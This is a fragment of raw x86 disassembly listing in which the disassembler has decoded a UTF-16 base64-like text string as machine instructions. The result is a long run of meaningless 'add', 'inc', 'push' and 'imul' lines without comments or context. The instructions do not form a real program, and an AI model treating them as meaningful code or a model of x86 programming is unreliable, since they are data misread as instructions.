  40ae4e:	42                   	inc    %edx
  40ae4f:	00 52 00             	add    %dl,0x0(%edx)
  40ae52:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40ae56:	2f                   	das
  40ae57:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40ae5b:	00 79 00             	add    %bh,0x0(%ecx)
  40ae5e:	47                   	inc    %edi
  40ae5f:	00 32                	add    %dh,(%edx)
  40ae61:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae64:	69 00 43 00 58 00    	imul   $0x580043,(%eax),%eax
  40ae6a:	57                   	push   %edi
  40ae6b:	00 32                	add    %dh,(%edx)
  40ae6d:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40ae71:	00 4a 00             	add    %cl,0x0(%edx)
  40ae74:	6d                   	insl   (%dx),%es:(%edi)
  40ae75:	00 49 00             	add    %cl,0x0(%ecx)
  40ae78:	32 00                	xor    (%eax),%al
  40ae7a:	63 00                	arpl   %eax,(%eax)
  40ae7c:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40ae80:	48                   	dec    %eax
  40ae81:	00 5a 00             	add    %bl,0x0(%edx)
  40ae84:	4c                   	dec    %esp
  40ae85:	00 55 00             	add    %dl,0x0(%ebp)
  40ae88:	44                   	inc    %esp
  40ae89:	00 61 00             	add    %ah,0x0(%ecx)
  40ae8c:	31 00                	xor    %eax,(%eax)
  40ae8e:	35 00 74 00 37       	xor    $0x37007400,%eax
  40ae93:	00 4e 00             	add    %cl,0x0(%esi)
  40ae96:	59                   	pop    %ecx
  40ae97:	00 45 00             	add    %al,0x0(%ebp)
  40ae9a:	55                   	push   %ebp
  40ae9b:	00 48 00             	add    %cl,0x0(%eax)
  40ae9e:	4c                   	dec    %esp
  40ae9f:	00 38                	add    %bh,(%eax)
  40aea1:	00 4b 00             	add    %cl,0x0(%ebx)
  40aea4:	34 00                	xor    $0x0,%al
  40aea6:	37                   	aaa
  40aea7:	00 47 00             	add    %al,0x0(%edi)
  40aeaa:	6b 00 75             	imul   $0x75,(%eax),%eax
  40aead:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40aeb1:	00 76 00             	add    %dh,0x0(%esi)
  40aeb4:	39 00                	cmp    %eax,(%eax)
  40aeb6:	57                   	push   %edi
  40aeb7:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40aebb:	00 62 00             	add    %ah,0x0(%edx)
  40aebe:	32 00                	xor    (%eax),%al
  40aec0:	56                   	push   %esi
  40aec1:	00 63 00             	add    %ah,0x0(%ebx)
  40aec4:	2f                   	das
  40aec5:	00 39                	add    %bh,(%ecx)
  40aec7:	00 51 00             	add    %dl,0x0(%ecx)
  40aeca:	73 00                	jae    0x40aecc
  40aecc:	61                   	popa
  40aecd:	00 39                	add    %bh,(%ecx)
  40aecf:	00 6a 00             	add    %ch,0x0(%edx)
  40aed2:	74 00                	je     0x40aed4
  40aed4:	6f                   	outsl  %ds:(%esi),(%dx)
  40aed5:	00 35 00 42 00 6a    	add    %dh,0x6a004200
  40aedb:	00 6b 00             	add    %ch,0x0(%ebx)
  40aede:	77 00                	ja     0x40aee0
  40aee0:	50                   	push   %eax
  40aee1:	00 56 00             	add    %dl,0x0(%esi)
  40aee4:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40aee8:	34 00                	xor    $0x0,%al
  40aeea:	66 00 36             	data16 add %dh,(%esi)
  40aeed:	00 76 00             	add    %dh,0x0(%esi)
  40aef0:	66 00 33             	data16 add %dh,(%ebx)
  40aef3:	00 45 00             	add    %al,0x0(%ebp)
  40aef6:	35 00 35 00 74       	xor    $0x74003500,%eax
  40aefb:	00 76 00             	add    %dh,0x0(%esi)
  40aefe:	55                   	push   %ebp
  40aeff:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40af03:	00 32                	add    %dh,(%edx)
  40af05:	00 55 00             	add    %dl,0x0(%ebp)
  40af08:	49                   	dec    %ecx
  40af09:	00 71 00             	add    %dh,0x0(%ecx)
  40af0c:	51                   	push   %ecx
  40af0d:	00 4e 00             	add    %cl,0x0(%esi)
  40af10:	50                   	push   %eax
  40af11:	00 78 00             	add    %bh,0x0(%eax)
  40af14:	46                   	inc    %esi
  40af15:	00 41 00             	add    %al,0x0(%ecx)
  40af18:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40af1c:	6c                   	insb   (%dx),%es:(%edi)
  40af1d:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40af21:	00 66 00             	add    %ah,0x0(%esi)
  40af24:	32 00                	xor    (%eax),%al
  40af26:	61                   	popa
  40af27:	00 65 00             	add    %ah,0x0(%ebp)
  40af2a:	31 00                	xor    %eax,(%eax)
  40af2c:	52                   	push   %edx
  40af2d:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40af31:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af34:	76 00                	jbe    0x40af36
  40af36:	77 00                	ja     0x40af38
  40af38:	35 00 74 00 6a       	xor    $0x6a007400,%eax
  40af3d:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40af41:	00 71 00             	add    %dh,0x0(%ecx)
  40af44:	44                   	inc    %esp
  40af45:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40af49:	00 78 00             	add    %bh,0x0(%eax)
  40af4c:	31 00                	xor    %eax,(%eax)
  40af4e:	38 00                	cmp    %al,(%eax)
  40af50:	56                   	push   %esi
  40af51:	00 55 00             	add    %dl,0x0(%ebp)
  40af54:	52                   	push   %edx
  40af55:	00 62 00             	add    %ah,0x0(%edx)
  40af58:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40af5c:	52                   	push   %edx
  40af5d:	00 31                	add    %dh,(%ecx)
  40af5f:	00 58 00             	add    %bl,0x0(%eax)
  40af62:	78 00                	js     0x40af64
  40af64:	7a 00                	jp     0x40af66
  40af66:	59                   	pop    %ecx
  40af67:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af6a:	68 00 74 00 64       	push   $0x64007400
  40af6f:	00 6a 00             	add    %ch,0x0(%edx)
  40af72:	78 00                	js     0x40af74
  40af74:	38 00                	cmp    %al,(%eax)
  40af76:	69 00 6c 00 59 00    	imul   $0x59006c,(%eax),%eax
  40af7c:	76 00                	jbe    0x40af7e
  40af7e:	71 00                	jno    0x40af80
  40af80:	75 00                	jne    0x40af82
  40af82:	78 00                	js     0x40af84
  40af84:	2b 00                	sub    (%eax),%eax
  40af86:	30 00                	xor    %al,(%eax)
  40af88:	73 00                	jae    0x40af8a
  40af8a:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40af8e:	6c                   	insb   (%dx),%es:(%edi)
  40af8f:	00 56 00             	add    %dl,0x0(%esi)
  40af92:	39 00                	cmp    %eax,(%eax)
  40af94:	65 00 54 00 48       	add    %dl,%gs:0x48(%eax,%eax,1)
  40af99:	00 76 00             	add    %dh,0x0(%esi)
  40af9c:	77 00                	ja     0x40af9e
  40af9e:	31 00                	xor    %eax,(%eax)
  40afa0:	42                   	inc    %edx
  40afa1:	00 50 00             	add    %dl,0x0(%eax)
  40afa4:	6b 00 50             	imul   $0x50,(%eax),%eax
  40afa7:	00 4a 00             	add    %cl,0x0(%edx)
  40afaa:	38 00                	cmp    %al,(%eax)
  40afac:	56                   	push   %esi
  40afad:	00 2b                	add    %ch,(%ebx)
  40afaf:	00 6d 00             	add    %ch,0x0(%ebp)
  40afb2:	59                   	pop    %ecx
  40afb3:	00 6f 00             	add    %ch,0x0(%edi)
  40afb6:	4d                   	dec    %ebp
  40afb7:	00 4a 00             	add    %cl,0x0(%edx)
  40afba:	57                   	push   %edi
  40afbb:	00 36                	add    %dh,(%esi)
  40afbd:	00 43 00             	add    %al,0x0(%ebx)
  40afc0:	4b                   	dec    %ebx
  40afc1:	00 51 00             	add    %dl,0x0(%ecx)
  40afc4:	76 00                	jbe    0x40afc6
  40afc6:	33 00                	xor    (%eax),%eax
  40afc8:	4c                   	dec    %esp
  40afc9:	00 6e 00             	add    %ch,0x0(%esi)
  40afcc:	4b                   	dec    %ebx
  40afcd:	00 78 00             	add    %bh,0x0(%eax)
  40afd0:	44                   	inc    %esp
  40afd1:	00 72 00             	add    %dh,0x0(%edx)
  40afd4:	67 00 76 00          	add    %dh,0x0(%bp)
  40afd8:	48                   	dec    %eax
  40afd9:	00 4a 00             	add    %cl,0x0(%edx)
  40afdc:	47                   	inc    %edi
  40afdd:	00 71 00             	add    %dh,0x0(%ecx)
  40afe0:	62 00                	bound  %eax,(%eax)
  40afe2:	33 00                	xor    (%eax),%eax
  40afe4:	2b 00                	sub    (%eax),%eax
  40afe6:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40afea:	78 00                	js     0x40afec
  40afec:	7a 00                	jp     0x40afee
  40afee:	46                   	inc    %esi
  40afef:	00 69 00             	add    %ch,0x0(%ecx)
  40aff2:	65 00 33             	add    %dh,%gs:(%ebx)
  40aff5:	00 76 00             	add    %dh,0x0(%esi)
  40aff8:	48                   	dec    %eax
  40aff9:	00 4d 00             	add    %cl,0x0(%ebp)
  40affc:	4f                   	dec    %edi
  40affd:	00 76 00             	add    %dh,0x0(%esi)
  40b000:	32 00                	xor    (%eax),%al
  40b002:	6a 00                	push   $0x0
  40b004:	6b 00 31             	imul   $0x31,(%eax),%eax
  40b007:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40b00b:	00 65 00             	add    %ah,0x0(%ebp)
  40b00e:	5a                   	pop    %edx
  40b00f:	00 38                	add    %bh,(%eax)
  40b011:	00 65 00             	add    %ah,0x0(%ebp)
  40b014:	34 00                	xor    $0x0,%al
  40b016:	45                   	inc    %ebp
  40b017:	00 47 00             	add    %al,0x0(%edi)
  40b01a:	30 00                	xor    %al,(%eax)
  40b01c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b01d:	00 36                	add    %dh,(%esi)
  40b01f:	00 62 00             	add    %ah,0x0(%edx)
  40b022:	31 00                	xor    %eax,(%eax)
  40b024:	47                   	inc    %edi
  40b025:	00 41 00             	add    %al,0x0(%ecx)
  40b028:	55                   	push   %ebp
  40b029:	00 53 00             	add    %dl,0x0(%ebx)
  40b02c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b02d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b030:	7a 00                	jp     0x40b032
  40b032:	6e                   	outsb  %ds:(%esi),(%dx)
  40b033:	00 31                	add    %dh,(%ecx)
  40b035:	00 4d 00             	add    %cl,0x0(%ebp)
  40b038:	45                   	inc    %ebp
  40b039:	00 70 00             	add    %dh,0x0(%eax)
  40b03c:	4d                   	dec    %ebp
  40b03d:	00 46 00             	add    %al,0x0(%esi)
  40b040:	63 00                	arpl   %eax,(%eax)
  40b042:	30 00                	xor    %al,(%eax)
  40b044:	37                   	aaa
  40b045:	00 56 00             	add    %dl,0x0(%esi)
  40b048:	70 00                	jo     0x40b04a
  40b04a:	32 00                	xor    (%eax),%al
  40b04c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b04d:	00 78 00             	add    %bh,0x0(%eax)
  40b050:	57                   	push   %edi
  40b051:	00 5a 00             	add    %bl,0x0(%edx)
  40b054:	70 00                	jo     0x40b056
  40b056:	79 00                	jns    0x40b058
  40b058:	5a                   	pop    %edx
  40b059:	00 50 00             	add    %dl,0x0(%eax)
  40b05c:	6d                   	insl   (%dx),%es:(%edi)
  40b05d:	00 79 00             	add    %bh,0x0(%ecx)
  40b060:	43                   	inc    %ebx
  40b061:	00 52 00             	add    %dl,0x0(%edx)
  40b064:	43                   	inc    %ebx
  40b065:	00 50 00             	add    %dl,0x0(%eax)
  40b068:	70 00                	jo     0x40b06a
  40b06a:	4a                   	dec    %edx
  40b06b:	00 36                	add    %dh,(%esi)
  40b06d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b070:	59                   	pop    %ecx
  40b071:	00 46 00             	add    %al,0x0(%esi)
  40b074:	43                   	inc    %ebx
  40b075:	00 69 00             	add    %ch,0x0(%ecx)
  40b078:	4c                   	dec    %esp
  40b079:	00 56 00             	add    %dl,0x0(%esi)
  40b07c:	5a                   	pop    %edx
  40b07d:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40b081:	00 50 00             	add    %dl,0x0(%eax)
  40b084:	61                   	popa
  40b085:	00 7a 00             	add    %bh,0x0(%edx)
  40b088:	30 00                	xor    %al,(%eax)
  40b08a:	74 00                	je     0x40b08c
  40b08c:	4e                   	dec    %esi
  40b08d:	00 33                	add    %dh,(%ebx)
  40b08f:	00 31                	add    %dh,(%ecx)
  40b091:	00 4e 00             	add    %cl,0x0(%esi)
  40b094:	38 00                	cmp    %al,(%eax)
  40b096:	5a                   	pop    %edx
  40b097:	00 47 00             	add    %al,0x0(%edi)
  40b09a:	2b 00                	sub    (%eax),%eax
  40b09c:	49                   	dec    %ecx
  40b09d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0a0:	4a                   	dec    %edx
  40b0a1:	00 77 00             	add    %dh,0x0(%edi)
  40b0a4:	46                   	inc    %esi
  40b0a5:	00 58 00             	add    %bl,0x0(%eax)
  40b0a8:	6b 00 4f             	imul   $0x4f,(%eax),%eax
  40b0ab:	00 35 00 51 00 76    	add    %dh,0x76005100
  40b0b1:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40b0b5:	00 65 00             	add    %ah,0x0(%ebp)
  40b0b8:	46                   	inc    %esi
  40b0b9:	00 33                	add    %dh,(%ebx)
  40b0bb:	00 67 00             	add    %ah,0x0(%edi)
  40b0be:	35 00 30 00 6b       	xor    $0x6b003000,%eax
  40b0c3:	00 35 00 64 00 45    	add    %dh,0x45006400
  40b0c9:	00 6f 00             	add    %ch,0x0(%edi)
  40b0cc:	38 00                	cmp    %al,(%eax)
  40b0ce:	5a                   	pop    %edx
  40b0cf:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b0d3:	00 57 00             	add    %dl,0x0(%edi)
  40b0d6:	43                   	inc    %ebx
  40b0d7:	00 75 00             	add    %dh,0x0(%ebp)
  40b0da:	62 00                	bound  %eax,(%eax)
  40b0dc:	48                   	dec    %eax
  40b0dd:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40b0e1:	00 70 00             	add    %dh,0x0(%eax)
  40b0e4:	6c                   	insb   (%dx),%es:(%edi)
  40b0e5:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40b0e9:	00 6e 00             	add    %ch,0x0(%esi)
  40b0ec:	4c                   	dec    %esp
  40b0ed:	00 58 00             	add    %bl,0x0(%eax)
  40b0f0:	51                   	push   %ecx
  40b0f1:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0f4:	50                   	push   %eax
  40b0f5:	00 32                	add    %dh,(%edx)
  40b0f7:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0fa:	69 00 33 00 32 00    	imul   $0x320033,(%eax),%eax
  40b100:	77 00                	ja     0x40b102
  40b102:	33 00                	xor    (%eax),%eax
  40b104:	36 00 2f             	add    %ch,%ss:(%edi)
  40b107:	00 68 00             	add    %ch,0x0(%eax)
  40b10a:	6a 00                	push   $0x0
  40b10c:	62 00                	bound  %eax,(%eax)
  40b10e:	39 00                	cmp    %eax,(%eax)
  40b110:	38 00                	cmp    %al,(%eax)
  40b112:	6d                   	insl   (%dx),%es:(%edi)
  40b113:	00 66 00             	add    %ah,0x0(%esi)
  40b116:	69 00 31 00 72 00    	imul   $0x720031,(%eax),%eax
  40b11c:	70 00                	jo     0x40b11e
  40b11e:	35 00 61 00 45       	xor    $0x45006100,%eax
  40b123:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40b127:	00 43 00             	add    %al,0x0(%ebx)
  40b12a:	6b 00 39             	imul   $0x39,(%eax),%eax
  40b12d:	00 41 00             	add    %al,0x0(%ecx)
  40b130:	6f                   	outsl  %ds:(%esi),(%dx)
  40b131:	00 75 00             	add    %dh,0x0(%ebp)
  40b134:	42                   	inc    %edx
  40b135:	00 32                	add    %dh,(%edx)
  40b137:	00 56 00             	add    %dl,0x0(%esi)
  40b13a:	63 00                	arpl   %eax,(%eax)
  40b13c:	5a                   	pop    %edx
  40b13d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b140:	41                   	inc    %ecx
  40b141:	00 4a 00             	add    %cl,0x0(%edx)
  40b144:	43                   	inc    %ebx
  40b145:	00 4f 00             	add    %cl,0x0(%edi)
  40b148:	6d                   	insl   (%dx),%es:(%edi)
  40b149:	00 70 00             	add    %dh,0x0(%eax)
  40b14c:	6c                   	insb   (%dx),%es:(%edi)
  40b14d:	00 49 00             	add    %cl,0x0(%ecx)
  40b150:	33 00                	xor    (%eax),%eax
  40b152:	30 00                	xor    %al,(%eax)
  40b154:	41                   	inc    %ecx
  40b155:	00 6e 00             	add    %ch,0x0(%esi)
  40b158:	56                   	push   %esi
  40b159:	00 70 00             	add    %dh,0x0(%eax)
  40b15c:	79 00                	jns    0x40b15e
  40b15e:	63 00                	arpl   %eax,(%eax)
  40b160:	47                   	inc    %edi
  40b161:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40b165:	00 79 00             	add    %bh,0x0(%ecx)
  40b168:	43                   	inc    %ebx
  40b169:	00 6a 00             	add    %ch,0x0(%edx)
  40b16c:	66 00 6c 00 71       	data16 add %ch,0x71(%eax,%eax,1)
  40b171:	00 57 00             	add    %dl,0x0(%edi)
  40b174:	51                   	push   %ecx
  40b175:	00 46 00             	add    %al,0x0(%esi)
  40b178:	30 00                	xor    %al,(%eax)
  40b17a:	55                   	push   %ebp
  40b17b:	00 75 00             	add    %dh,0x0(%ebp)
  40b17e:	2b 00                	sub    (%eax),%eax
  40b180:	41                   	inc    %ecx
  40b181:	00 66 00             	add    %ah,0x0(%esi)
  40b184:	57                   	push   %edi
  40b185:	00 59 00             	add    %bl,0x0(%ecx)
  40b188:	77 00                	ja     0x40b18a
  40b18a:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40b18e:	32 00                	xor    (%eax),%al
  40b190:	50                   	push   %eax
  40b191:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40b195:	00 30                	add    %dh,(%eax)
  40b197:	00 32                	add    %dh,(%edx)
  40b199:	00 67 00             	add    %ah,0x0(%edi)
  40b19c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b19d:	00 62 00             	add    %ah,0x0(%edx)
  40b1a0:	37                   	aaa
  40b1a1:	00 2b                	add    %ch,(%ebx)
  40b1a3:	00 77 00             	add    %dh,0x0(%edi)
  40b1a6:	33 00                	xor    (%eax),%eax
  40b1a8:	51                   	push   %ecx
  40b1a9:	00 4a 00             	add    %cl,0x0(%edx)
  40b1ac:	7a 00                	jp     0x40b1ae
  40b1ae:	71 00                	jno    0x40b1b0
  40b1b0:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b1b4:	37                   	aaa
  40b1b5:	00 66 00             	add    %ah,0x0(%esi)
  40b1b8:	6a 00                	push   $0x0
  40b1ba:	77 00                	ja     0x40b1bc
  40b1bc:	72 00                	jb     0x40b1be
  40b1be:	49                   	dec    %ecx
  40b1bf:	00 38                	add    %bh,(%eax)
  40b1c1:	00 6a 00             	add    %ch,0x0(%edx)
  40b1c4:	71 00                	jno    0x40b1c6
  40b1c6:	66 00 54 00 4a       	data16 add %dl,0x4a(%eax,%eax,1)
  40b1cb:	00 5a 00             	add    %bl,0x0(%edx)
  40b1ce:	39 00                	cmp    %eax,(%eax)
  40b1d0:	44                   	inc    %esp
  40b1d1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1d4:	67 00 44 00          	add    %al,0x0(%si)
  40b1d8:	44                   	inc    %esp
  40b1d9:	00 6e 00             	add    %ch,0x0(%esi)
  40b1dc:	2b 00                	sub    (%eax),%eax
  40b1de:	54                   	push   %esp
  40b1df:	00 51 00             	add    %dl,0x0(%ecx)
  40b1e2:	51                   	push   %ecx
  40b1e3:	00 58 00             	add    %bl,0x0(%eax)
  40b1e6:	4a                   	dec    %edx
  40b1e7:	00 35 00 47 00 66    	add    %dh,0x66004700
  40b1ed:	00 57 00             	add    %dl,0x0(%edi)
  40b1f0:	55                   	push   %ebp
  40b1f1:	00 47 00             	add    %al,0x0(%edi)
  40b1f4:	48                   	dec    %eax
  40b1f5:	00 33                	add    %dh,(%ebx)
  40b1f7:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40b1fb:	00 33                	add    %dh,(%ebx)
  40b1fd:	00 31                	add    %dh,(%ecx)
  40b1ff:	00 71 00             	add    %dh,0x0(%ecx)
  40b202:	59                   	pop    %ecx
  40b203:	00 31                	add    %dh,(%ecx)
  40b205:	00 2b                	add    %ch,(%ebx)
  40b207:	00 39                	add    %bh,(%ecx)
  40b209:	00 77 00             	add    %dh,0x0(%edi)
  40b20c:	34 00                	xor    $0x0,%al
  40b20e:	45                   	inc    %ebp
  40b20f:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40b213:	00 75 00             	add    %dh,0x0(%ebp)
  40b216:	54                   	push   %esp
  40b217:	00 48 00             	add    %cl,0x0(%eax)
  40b21a:	35 00 68 00 7a       	xor    $0x7a006800,%eax
  40b21f:	00 4d 00             	add    %cl,0x0(%ebp)
  40b222:	71 00                	jno    0x40b224
  40b224:	43                   	inc    %ebx
  40b225:	00 31                	add    %dh,(%ecx)
  40b227:	00 41 00             	add    %al,0x0(%ecx)
  40b22a:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40b22e:	37                   	aaa
  40b22f:	00 48 00             	add    %cl,0x0(%eax)
  40b232:	6c                   	insb   (%dx),%es:(%edi)
  40b233:	00 41 00             	add    %al,0x0(%ecx)
  40b236:	39 00                	cmp    %eax,(%eax)
  40b238:	41                   	inc    %ecx
  40b239:	00 65 00             	add    %ah,0x0(%ebp)
  40b23c:	41                   	inc    %ecx
  40b23d:	00 69 00             	add    %ch,0x0(%ecx)
  40b240:	58                   	pop    %eax
  40b241:	00 56 00             	add    %dl,0x0(%esi)
  40b244:	54                   	push   %esp
  40b245:	00 56 00             	add    %dl,0x0(%esi)
  40b248:	4f                   	dec    %edi
  40b249:	00 4a 00             	add    %cl,0x0(%edx)
  40b24c:	4d                   	dec    %ebp
  40b24d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b250:	61                   	popa
  40b251:	00 4b 00             	add    %cl,0x0(%ebx)
  40b254:	4b                   	dec    %ebx
  40b255:	00 52 00             	add    %dl,0x0(%edx)
  40b258:	37                   	aaa
  40b259:	00 38                	add    %bh,(%eax)
  40b25b:	00 79 00             	add    %bh,0x0(%ecx)
  40b25e:	43                   	inc    %ebx
  40b25f:	00 61 00             	add    %ah,0x0(%ecx)
  40b262:	6e                   	outsb  %ds:(%esi),(%dx)
  40b263:	00 49 00             	add    %cl,0x0(%ecx)
  40b266:	4f                   	dec    %edi
  40b267:	00 66 00             	add    %ah,0x0(%esi)
  40b26a:	6c                   	insb   (%dx),%es:(%edi)
  40b26b:	00 67 00             	add    %ah,0x0(%edi)
  40b26e:	4f                   	dec    %edi
  40b26f:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40b273:	00 70 00             	add    %dh,0x0(%eax)
  40b276:	4e                   	dec    %esi
  40b277:	00 52 00             	add    %dl,0x0(%edx)
  40b27a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40b27d:	00 36                	add    %dh,(%esi)
  40b27f:	00 35 00 69 00 55    	add    %dh,0x55006900
  40b285:	00 76 00             	add    %dh,0x0(%esi)
  40b288:	42                   	inc    %edx
  40b289:	00 7a 00             	add    %bh,0x0(%edx)
  40b28c:	71 00                	jno    0x40b28e
  40b28e:	6a 00                	push   $0x0
  40b290:	69 00 61 00 59 00    	imul   $0x590061,(%eax),%eax
  40b296:	35 00 4e 00 6b       	xor    $0x6b004e00,%eax
  40b29b:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40b29f:	00 65 00             	add    %ah,0x0(%ebp)
  40b2a2:	79 00                	jns    0x40b2a4
  40b2a4:	44                   	inc    %esp
  40b2a5:	00 63 00             	add    %ah,0x0(%ebx)
  40b2a8:	49                   	dec    %ecx
  40b2a9:	00 36                	add    %dh,(%esi)
  40b2ab:	00 69 00             	add    %ch,0x0(%ecx)
  40b2ae:	61                   	popa
  40b2af:	00 42 00             	add    %al,0x0(%edx)
  40b2b2:	33 00                	xor    (%eax),%eax
  40b2b4:	50                   	push   %eax
  40b2b5:	00 45 00             	add    %al,0x0(%ebp)
  40b2b8:	63 00                	arpl   %eax,(%eax)
  40b2ba:	59                   	pop    %ecx
  40b2bb:	00 62 00             	add    %ah,0x0(%edx)
  40b2be:	6a 00                	push   $0x0
  40b2c0:	51                   	push   %ecx
  40b2c1:	00 57 00             	add    %dl,0x0(%edi)
  40b2c4:	45                   	inc    %ebp
  40b2c5:	00 70 00             	add    %dh,0x0(%eax)
  40b2c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2c9:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40b2cd:	00 4f 00             	add    %cl,0x0(%edi)
  40b2d0:	55                   	push   %ebp
  40b2d1:	00 36                	add    %dh,(%esi)
  40b2d3:	00 71 00             	add    %dh,0x0(%ecx)
  40b2d6:	4d                   	dec    %ebp
  40b2d7:	00 57 00             	add    %dl,0x0(%edi)
  40b2da:	33 00                	xor    (%eax),%eax
  40b2dc:	69 00 44 00 46 00    	imul   $0x460044,(%eax),%eax
  40b2e2:	47                   	inc    %edi
  40b2e3:	00 76 00             	add    %dh,0x0(%esi)
  40b2e6:	4b                   	dec    %ebx
  40b2e7:	00 42 00             	add    %al,0x0(%edx)
  40b2ea:	4c                   	dec    %esp
  40b2eb:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40b2ef:	00 35 00 54 00 57    	add    %dh,0x57005400
  40b2f5:	00 58 00             	add    %bl,0x0(%eax)
  40b2f8:	62 00                	bound  %eax,(%eax)
  40b2fa:	42                   	inc    %edx
  40b2fb:	00 56 00             	add    %dl,0x0(%esi)
  40b2fe:	57                   	push   %edi
  40b2ff:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40b303:	00 70 00             	add    %dh,0x0(%eax)
  40b306:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b30a:	57                   	push   %edi
  40b30b:	00 49 00             	add    %cl,0x0(%ecx)
  40b30e:	51                   	push   %ecx
  40b30f:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40b313:	00 6a 00             	add    %ch,0x0(%edx)
  40b316:	71 00                	jno    0x40b318
  40b318:	7a 00                	jp     0x40b31a
  40b31a:	33 00                	xor    (%eax),%eax
  40b31c:	78 00                	js     0x40b31e
  40b31e:	62 00                	bound  %eax,(%eax)
  40b320:	35 00 70 00 73       	xor    $0x73007000,%eax
  40b325:	00 62 00             	add    %ah,0x0(%edx)
  40b328:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b32b:	00 45 00             	add    %al,0x0(%ebp)
  40b32e:	76 00                	jbe    0x40b330
  40b330:	78 00                	js     0x40b332
  40b332:	2b 00                	sub    (%eax),%eax
  40b334:	6a 00                	push   $0x0
  40b336:	44                   	inc    %esp
  40b337:	00 6b 00             	add    %ch,0x0(%ebx)
  40b33a:	5a                   	pop    %edx
  40b33b:	00 76 00             	add    %dh,0x0(%esi)
  40b33e:	30 00                	xor    %al,(%eax)
  40b340:	77 00                	ja     0x40b342
  40b342:	71 00                	jno    0x40b344
  40b344:	79 00                	jns    0x40b346
  40b346:	6e                   	outsb  %ds:(%esi),(%dx)
  40b347:	00 4e 00             	add    %cl,0x0(%esi)
  40b34a:	4c                   	dec    %esp
  40b34b:	00 61 00             	add    %ah,0x0(%ecx)
  40b34e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b34f:	00 67 00             	add    %ah,0x0(%edi)
  40b352:	6d                   	insl   (%dx),%es:(%edi)
  40b353:	00 49 00             	add    %cl,0x0(%ecx)
  40b356:	73 00                	jae    0x40b358
  40b358:	32 00                	xor    (%eax),%al
  40b35a:	51                   	push   %ecx
  40b35b:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40b35f:	00 6f 00             	add    %ch,0x0(%edi)
  40b362:	32 00                	xor    (%eax),%al
  40b364:	47                   	inc    %edi
  40b365:	00 61 00             	add    %ah,0x0(%ecx)
  40b368:	38 00                	cmp    %al,(%eax)
  40b36a:	77 00                	ja     0x40b36c
  40b36c:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40b370:	4e                   	dec    %esi
  40b371:	00 72 00             	add    %dh,0x0(%edx)
  40b374:	57                   	push   %edi
  40b375:	00 66 00             	add    %ah,0x0(%esi)
  40b378:	68 00 49 00 52       	push   $0x52004900
  40b37d:	00 36                	add    %dh,(%esi)
  40b37f:	00 33                	add    %dh,(%ebx)
  40b381:	00 5a 00             	add    %bl,0x0(%edx)
  40b384:	2b 00                	sub    (%eax),%eax
  40b386:	5a                   	pop    %edx
  40b387:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40b38b:	00 36                	add    %dh,(%esi)
  40b38d:	00 67 00             	add    %ah,0x0(%edi)
  40b390:	4e                   	dec    %esi
  40b391:	00 78 00             	add    %bh,0x0(%eax)
  40b394:	61                   	popa
  40b395:	00 50 00             	add    %dl,0x0(%eax)
  40b398:	62 00                	bound  %eax,(%eax)
  40b39a:	63 00                	arpl   %eax,(%eax)
  40b39c:	79 00                	jns    0x40b39e
  40b39e:	4f                   	dec    %edi
  40b39f:	00 36                	add    %dh,(%esi)
  40b3a1:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3a4:	48                   	dec    %eax
  40b3a5:	00 67 00             	add    %ah,0x0(%edi)
